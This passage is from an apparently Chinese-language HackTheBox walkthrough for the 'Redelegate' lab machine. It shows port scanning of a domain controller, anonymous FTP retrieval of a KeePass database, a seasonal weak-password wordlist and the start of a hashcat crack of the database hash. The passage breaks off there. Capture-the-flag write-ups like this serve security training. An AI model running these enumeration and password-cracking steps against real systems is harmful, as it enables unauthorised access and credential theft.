+</span></span><span style="display:flex;"><span>Open 10.129.234.50:1433
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:3268
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:3269
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:3389
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:5985
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:9389
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:47001
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:49664
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:49665
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:49667
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:49666
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:49668
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:49932
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:57719
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:58976
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:58975
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:58979
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:58983
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:58995
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>~<span style="color:#f92672">]</span> Starting Script<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>~<span style="color:#f92672">]</span> Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-09-21 01:09 EDT
+</span></span><span style="display:flex;"><span>Initiating Ping Scan at 01:09
+</span></span><span style="display:flex;"><span>Scanning 10.129.234.50 <span style="color:#f92672">[</span><span style="color:#ae81ff">4</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Completed Ping Scan at 01:09, 0.09s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating Parallel DNS resolution of <span style="color:#ae81ff">1</span> host. at 01:09
+</span></span><span style="display:flex;"><span>Completed Parallel DNS resolution of <span style="color:#ae81ff">1</span> host. at 01:09, 2.02s elapsed
+</span></span><span style="display:flex;"><span>DNS resolution of <span style="color:#ae81ff">1</span> IPs took 2.02s. Mode: Async <span style="color:#f92672">[</span><span style="color:#75715e">#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span>
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 01:09
+</span></span><span style="display:flex;"><span>Scanning 10.129.234.50 <span style="color:#f92672">[</span><span style="color:#ae81ff">30</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 135/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 445/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 53/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 3389/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 139/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 21/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 389/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 49664/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 9389/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 49667/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 57719/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 58995/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 47001/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 88/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 58979/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 49932/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 49666/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 464/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 593/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 3268/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 58975/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 1433/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 636/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 58976/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 49668/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 5985/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 58983/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 3269/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Discovered open port 49665/tcp on 10.129.234.50
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 01:09, 0.27s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">30</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.234.50
+</span></span><span style="display:flex;"><span>Host is up, received echo-reply ttl <span style="color:#ae81ff">127</span> <span style="color:#f92672">(</span>0.12s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2025-09-21 01:09:36 EDT <span style="color:#66d9ef">for</span> 0s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE          REASON
+</span></span><span style="display:flex;"><span>21/tcp    open  ftp              syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>53/tcp    open  domain           syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>80/tcp    open  http             syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec     syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc            syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn      syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap             syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds     syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5         syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>593/tcp   open  http-rpc-epmap   syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>636/tcp   open  ldapssl          syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>1433/tcp  open  ms-sql-s         syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>3268/tcp  open  globalcatLDAP    syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>3269/tcp  open  globalcatLDAPssl syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>3389/tcp  open  ms-wbt-server    syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>5985/tcp  open  wsman            syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>9389/tcp  open  adws             syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>47001/tcp open  winrm            syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>49664/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>49665/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>49666/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>49667/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>49668/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>49932/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>57719/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>58975/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>58976/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>58979/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>58983/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>58995/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 2.49 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">34</span> <span style="color:#f92672">(</span>1.472KB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">31</span> <span style="color:#f92672">(</span>1.348KB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat hostname 
+</span></span><span style="display:flex;"><span>10.129.234.50     DC.redelegate.vl redelegate.vl DC
+</span></span></code></pre></div><p>对于一台域控来说不常见端口有ftp和http,http页面是默认的iis页面，我准备最后再来研究它（需要的话）</p>
+<p>匿名smb,ldap，rpc都权限不足</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb <span style="color:#e6db74">&#34;</span>$ip<span style="color:#e6db74">&#34;</span> -u guest -p <span style="color:#e6db74">&#39;&#39;</span> --shares
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domin:redelegate.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> redelegate.vl<span style="color:#ae81ff">\g</span>uest: SessionError 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ rpcclient -U <span style="color:#e6db74">&#34;&#34;</span> -N $ip
+</span></span><span style="display:flex;"><span>rpcclient $&gt; enumdomusers
+</span></span><span style="display:flex;"><span>result was NT_STATUS_ACCESS_DENIED
+</span></span><span style="display:flex;"><span>rpcclient $&gt; nxc ldap $ip -u <span style="color:#e6db74">&#34;&#34;</span> -p <span style="color:#e6db74">&#34;&#34;</span> --users
+</span></span><span style="display:flex;"><span>command not found: nxc
+</span></span><span style="display:flex;"><span>rpcclient $&gt; exit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc ldap $ip -u <span style="color:#e6db74">&#34;&#34;</span> -p <span style="color:#e6db74">&#34;&#34;</span> --users
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.50   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:redelegate.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>channel binding:No TLS cert<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.50   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Error in searchRequest -&gt; operationsError: 000004DC: LdapErr: DSID-0C090DA9, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.50   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> redelegate.vl<span style="color:#ae81ff">\:</span> 
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.50   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Error in searchRequest -&gt; operationsError: 000004DC: LdapErr: DSID-0C090DA9, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c
+</span></span></code></pre></div><p>匿名ftp获取到信息，一个kpass数据库和两个txt,注意且binray模式防止文件损毁</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ftp $ip
+</span></span><span style="display:flex;"><span>Connected to 10.129.234.50.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> Microsoft FTP Service
+</span></span><span style="display:flex;"><span>Name <span style="color:#f92672">(</span>10.129.234.50:wackymaker<span style="color:#f92672">)</span>: anonymous
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">331</span> Anonymous access allowed, send identity <span style="color:#f92672">(</span>e-mail name<span style="color:#f92672">)</span> as password.
+</span></span><span style="display:flex;"><span>Password: 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">230</span> User logged in.
+</span></span><span style="display:flex;"><span>Remote system type is Windows_NT.
+</span></span><span style="display:flex;"><span>ftp&gt; dir
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|59635|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">125</span> Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>10-20-24  01:11AM                  <span style="color:#ae81ff">434</span> CyberAudit.txt
+</span></span><span style="display:flex;"><span>10-20-24  05:14AM                 <span style="color:#ae81ff">2622</span> Shared.kdbx
+</span></span><span style="display:flex;"><span>10-20-24  01:26AM                  <span style="color:#ae81ff">580</span> TrainingAgenda.txt
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span>ftp&gt; binary
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span> Type set to I.
+</span></span><span style="display:flex;"><span>ftp&gt; get CyberAudit.txt
+</span></span><span style="display:flex;"><span>local: CyberAudit.txt remote: CyberAudit.txt
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|59637|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">125</span> Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>100% |***************************************************|   <span style="color:#ae81ff">434</span>        4.57 KiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">434</span> bytes received in 00:00 <span style="color:#f92672">(</span>4.38 KiB/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ftp&gt; get Shared.kdbx
+</span></span><span style="display:flex;"><span>local: Shared.kdbx remote: Shared.kdbx
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|59638|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">125</span> Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>100% |***************************************************|  <span style="color:#ae81ff">2622</span>       32.19 KiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2622</span> bytes received in 00:00 <span style="color:#f92672">(</span>30.81 KiB/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ftp&gt; get TrainingAgenda.txt
+</span></span><span style="display:flex;"><span>local: TrainingAgenda.txt remote: TrainingAgenda.txt
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|59639|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">125</span> Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>100% |***************************************************|   <span style="color:#ae81ff">580</span>        7.13 KiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">580</span> bytes received in 00:00 <span style="color:#f92672">(</span>6.75 KiB/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ftp&gt; exit
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">221</span> Goodbye.
+</span></span></code></pre></div><p>还有两篇txt翻译如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>OCTOBER <span style="color:#ae81ff">2024</span> 审计结果（翻译）
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OCTOBER <span style="color:#ae81ff">2024</span> 审计发现
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> 网络安全审计发现：
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>用户密码弱
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>分配给用户的权限过大
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>未使用的 Active Directory 对象
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>危险的 Active Directory ACL（访问控制列表）
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 修复步骤：
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>提示用户更改密码：已完成
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>检查所有用户的权限并移除高权限：已完成
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>删除域中未使用的对象：进行中
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>重新检查 ACL：进行中
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>员工网络安全意识培训议程（2024 年 <span style="color:#ae81ff">10</span> 月）（翻译）
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>员工网络安全意识培训议程（2024 年 <span style="color:#ae81ff">10</span> 月）
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2024</span> 年 <span style="color:#ae81ff">10</span> 月 <span style="color:#ae81ff">4</span> 日 星期五 | 14:30 - 16:30 - <span style="color:#ae81ff">53</span> 名参会者
+</span></span><span style="display:flex;"><span>“别上当”——如何更好地识别钓鱼邮件以及看到可疑邮件时该怎么做
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2024</span> 年 <span style="color:#ae81ff">10</span> 月 <span style="color:#ae81ff">11</span> 日 星期五 | 15:30 - 17:30 - <span style="color:#ae81ff">61</span> 名参会者
+</span></span><span style="display:flex;"><span>“社交媒体及其风险”——你在线发布的内容会怎样被利用？
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2024</span> 年 <span style="color:#ae81ff">10</span> 月 <span style="color:#ae81ff">18</span> 日 星期五 | 11:30 - 13:30 - <span style="color:#ae81ff">7</span> 名参会者
+</span></span><span style="display:flex;"><span>“弱口令”——为什么 SeasonYear! 之类的密码不好
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2024</span> 年 <span style="color:#ae81ff">10</span> 月 <span style="color:#ae81ff">25</span> 日 星期五 | 09:30 - 12:30 - <span style="color:#ae81ff">29</span> 名参会者
+</span></span><span style="display:flex;"><span>“接下来怎么办？”——网络攻击的后果以及如何缓解
+</span></span></code></pre></div><p>鉴于靶机发布时间实际为2024年，我们可以构造弱口令字典</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat dic.txt 
+</span></span><span style="display:flex;"><span>Season2024!
+</span></span><span style="display:flex;"><span>Spring2024!
+</span></span><span style="display:flex;"><span>spring2024!
+</span></span><span style="display:flex;"><span>SPRING2024!
+</span></span><span style="display:flex;"><span>Summer2024!
+</span></span><span style="display:flex;"><span>summer2024!
+</span></span><span style="display:flex;"><span>SUMMER2024!
+</span></span><span style="display:flex;"><span>Autumn2024!
+</span></span><span style="display:flex;"><span>autumn2024!
+</span></span><span style="display:flex;"><span>AUTUMN2024!
+</span></span><span style="display:flex;"><span>Fall2024!
+</span></span><span style="display:flex;"><span>fall2024!
+</span></span><span style="display:flex;"><span>FALL2024!
+</span></span><span style="display:flex;"><span>Winter2024!
+</span></span><span style="display:flex;"><span>winter2024!
+</span></span><span style="display:flex;"><span>WINTER2024!
+</span></span><span style="display:flex;"><span>Spr2024!
+</span></span><span style="display:flex;"><span>spr2024!
+</span></span><span style="display:flex;"><span>SPR2024!
+</span></span><span style="display:flex;"><span>Sum2024!
+</span></span><span style="display:flex;"><span>sum2024!
+</span></span><span style="display:flex;"><span>SUM2024!
+</span></span><span style="display:flex;"><span>Aut2024!
+</span></span><span style="display:flex;"><span>aut2024!
+</span></span><span style="display:flex;"><span>AUT2024!
+</span></span><span style="display:flex;"><span>Fal2024!
+</span></span><span style="display:flex;"><span>fal2024!
+</span></span><span style="display:flex;"><span>FAL2024!
+</span></span><span style="display:flex;"><span>Win2024!
+</span></span><span style="display:flex;"><span>win2024!
+</span></span><span style="display:flex;"><span>WIN2024!
+</span></span></code></pre></div><p>欧克，开始解密kpass数据库,注意利用hashcat爆破需要将john转换hash的文件前面的文件名删除，所以你会看到我有一个vim的操作</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ keepass2john Shared.kdbx &gt; keepass.hash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat keepass.hash 
+</span></span><span style="display:flex;"><span>Shared:$keepass$*2*600000*0*ce7395f413946b0cd279501e510cf8a988f39baca623dd86beaee651025662e6*e4f9d51a5df3e5f9ca1019cd57e10d60f85f48228da3f3b4cf1ffee940e20e01*18c45dbbf7d365a13d6714059937ebad*a59af7b75908d7bdf68b6fd929d315ae6bfe77262e53c209869a236da830495f*806f9dd2081c364e66a114ce3adeba60b282fc5e5ee6f324114d38de9b4502ca
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ vim keepass.hash 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ hashcat -m <span style="color:#ae81ff">13400</span> -a <span style="color:#ae81ff">0</span> -w <span style="color:#ae81ff">1</span> keepass.hash dic.txt --force
+</span></span><span style="display:flex;"><span>hashcat <span style="color:#f92672">(</span>v6.2.6<span style="color:#f92672">)</span> starting
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>You have enabled --force to bypass dangerous warnings and errors!
+</span></span><span style="display:flex;"><span>This can hide serious problems and should only be <span style="color:#66d9ef">done</span> when debugging.
+</span></span><span style="display:flex;"><span>Do not report hashcat issues encountered when using --force.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OpenCL API <span style="color:#f92672">(</span>OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG<span style="color:#f92672">)</span> - Platform <span style="color:#75715e">#1 [The pocl project]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">====================================================================================================================================================</span>
+</span></span><span style="display:flex;"><span>* Device <span style="color:#75715e">#1: cpu-sandybridge-Intel(R) Core(TM) Ultra 9 185H, 6939/13942 MB (2048 MB allocatable), 8MCU</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Minimum password length supported by kernel: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>Maximum password length supported by kernel: <span style="color:#ae81ff">256</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hashes: <span style="color:#ae81ff">1</span> digests; <span style="color:#ae81ff">1</span> unique digests, <span style="color:#ae81ff">1</span> unique salts
+</span></span><span style="display:flex;"><span>Bitmaps: <span style="color:#ae81ff">16</span> bits, <span style="color:#ae81ff">65536</span> entries, 0x0000ffff mask, <span style="color:#ae81ff">262144</span> bytes, 5/13 rotates
+</span></span><span style="display:flex;"><span>Rules: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Optimizers applied:
+</span></span><span style="display:flex;"><span>* Zero-Byte
+</span></span><span style="display:flex;"><span>* Single-Hash
+</span></span><span style="display:flex;"><span>* Single-Salt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Watchdog: Temperature abort trigger set to 90c
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host memory required <span style="color:#66d9ef">for</span> this attack: <span style="color:#ae81ff">2</span> MB
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Dictionary cache built:
+</span></span><span style="display:flex;"><span>* Filename..: dic.txt
+</span></span><span style="display:flex;"><span>* Passwords.: <span style="color:#ae81ff">31</span>
+</span></span><span style="display:flex;"><span>* Bytes.....: <span style="color:#ae81ff">351</span>
+</span></span><span style="display:flex;"><span>* Keyspace..: <span style="color:#ae81ff">31</span>
+</span></span><span style="display:flex;"><span>* Runtime...: <span style="color:#ae81ff">0</span> secs
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The wordlist or mask that you are using is too small.
